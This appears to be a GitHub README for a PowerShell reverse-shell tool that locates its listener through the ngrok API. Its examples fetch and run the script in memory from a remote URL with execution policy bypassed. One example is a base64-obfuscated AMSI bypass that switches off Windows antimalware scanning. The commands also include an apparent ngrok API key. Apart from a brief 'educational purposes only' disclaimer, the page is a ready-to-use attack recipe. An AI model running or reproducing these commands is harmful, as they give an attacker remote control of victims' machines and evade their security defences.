## Video:
[![ScreenShot](https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/2022-06-01-18%3A57%3A38.png)](https://youtu.be/2w3Y46Z4BwE "Powershell Auto Ngrok RevShell")

## Description
```
Auto detect remote server using ngrok api
```

## Requirements:
```
Ngrok
Netcat
```

## Testing:
```
Windows 10 Version 21H2, (Build number 19044)
Windows 10 Version 20H2, (Build number 19042)
Windows 10 Version 2004, (Build number 19041)
Windows 10 Version 1909, (Build number 18363)
Windows 10 Version 1507, (Build number 10240)
```


## Example (Module):
```powershell
C:\PS> Import-Module .\Invoke-RevShell
C:\PS> Invoke-RevShell -api 29yvUB6uwEHpE8lhStj4qIdwZ2e_7Tq9NtyNJJ6vcpYPq6mhJ
```

## Example (Default):

```powershell
C:\PS> powershell -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol=Net.SecurityProtocolType]::Tls12;
                                  IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/Invoke-RevShell.ps1'); 
                                  Invoke-RevShell -api 29yvUB6uwEHpE8lhStj4qIdwZ2e_7Tq9NtyNJJ6vcpYPq6mhJ;"
```

## Example (Amsi Bypass):

```powershell
C:\PS> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);
C:\PS> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;
C:\PS> IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/Invoke-RevShell.ps1'); 
C:\PS> Invoke-RevShell -api 29yvUB6uwEHpE8lhStj4qIdwZ2e_7Tq9NtyNJJ6vcpYPq6mhJ;
```



## Disclaimer:

```
This tool is for educational purposes only.
We are not responsible for any illegal usage of this tool.
```
